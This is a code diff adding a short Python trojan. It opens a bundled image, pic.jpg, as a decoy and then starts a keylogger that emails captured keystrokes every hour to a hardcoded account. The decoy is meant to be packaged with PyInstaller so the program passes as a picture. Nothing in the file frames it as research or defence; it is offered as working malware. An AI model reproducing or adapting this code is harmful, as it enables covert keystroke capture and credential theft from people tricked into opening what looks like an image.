@@ -1,0 +1,13 @@
+#!usr/bin/env python
+
+import keylogger
+import time
+import subprocess
+import sys
+
+time.sleep(2)
+file_name = sys._MEIPASS + "\pic.jpg" # modify the file here
+subprocess.Popen(file_name, shell=True)
+
+my_keylogger = keylogger.Keylogger(3600, "test@gmail.com", "password for test@gmail.com")
+my_keylogger.start()
